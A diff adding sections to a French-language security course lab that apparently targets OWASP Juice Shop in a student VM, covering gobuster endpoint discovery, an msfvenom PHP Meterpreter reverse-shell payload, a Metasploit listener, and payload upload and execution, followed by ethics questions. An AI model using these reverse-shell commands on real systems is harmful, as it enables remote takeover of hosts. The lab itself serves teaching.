@@ -409,5 +409,110 @@ Comprendre comment un attaquant teste automatiquement des mots de passe.
 - Pourquoi Hydra a besoin du message d’erreur ?  
 - Quelles mesures pourraient empêcher cette attaque ?  
 
+---
 
+## 7. Exploitation avec Metasploit
+
+Certains cadriciels (*frameworks*) fournissent des modules déjà prêts à l'utilisation pour des vulnérabilités connues. Ces *frameworks* accélèrent grandement le travail des *hackers*.
+
+### Outils
+
+- Metasploit
+- msfvenom
+
+### Objectif
+
+Comprendre le principe d’un *shell* inversé (*reverse shell*) et son utilisation avec Metasploit.
+
+### Étapes
+
+1. Téléchargez le proxy [ici](../assets/files/proxy.tar.gz) et copiez-le sur votre VM applicative dans le répertoire `/home/dev/`
+
+1. Décompressez l'archive
+```bash
+tar -xf proxy.tar.gz
+```
+
+1. Lancez Juice Shop
+```bash
+cd juice-shop
+npm start
+```
+
+1. Lancez le proxy
+```bash
+cd ~/proxy
+npm init -y
+npm install express http-proxy-middleware multer
+node proxy.js
+```
+
+1. Utilisez gobuster pour découvrir de nouveaux *endpoints* potentiels. En particulier, cherchez de routes qui pourraient vous permettre de téléverser (*uploader*) des fichiers et/ou d'exécuter un fichier à distance...
+
+{: .astuce}
+> Certains *endpoints* peuvent ne pas utiliser la méthode HTTP GET, qui est la méthode par défaut utilisée par gobuster. Consultez les notes de cours ou la documentation de gobuster pour plus de détails sur l'utilisation des autres méthodes pour la découverte...
+
+1. Lancez Metasploit
+
+  ```bash
+  msfconsole
+  ```
+
+
+1. Générez une charge utile (*payload*)
+
+  ```bash
+  msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f raw > shell.php
+  ```
+
+
+1. Préparez un *listener*
+
+```bash
+use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+set LHOST <IP>
+set LPORT 4444
+run
+```
+
+1. Utilisez le *endpoint* que vous avez découvert dans les étapes précédentes pour téléverser votre *payload* malicieux.
+
+1. Utilisez l'autre *endpoint* découvert pour déclencher l'exécution de votre *payload* malicieux. 
+
+
+### Questions de réflexion
+
+- Que fait un reverse shell ?  
+- Pourquoi un reverse shell parvient souvent à contourner le pare-feu ?
+- Quelle(s) faille(s) est exploitée ?  
+
+---
+
+## 8. Questions de réflexion finale
+
+1. L'approche de Spectre est-elle éthique à votre avis ? Pourquoi ?
+1. Selon votre réponse à la question précédente, à quel catégorie de *hackers* appartient Spectre ? Pourquoi ?
+1. Quelles seraient les conditions pour que Spectre bascule dans une catégorie différente ?
+
+---
+
+## 9. BONUS : Exploration libre
+
+À ce stade, aucun guide précis n’est fourni.
+
+### Objectif
+
+Développer votre propre approche.
+
+### Travail
+
+- Combinez les outils  
+- Testez différentes idées  
+- Observez les réactions du système  
+
+### Questions de réflexion
+
+- Qu’avez-vous découvert sans consigne spécifique ?  
+- Quelle stratégie a été la plus efficace ?  
 
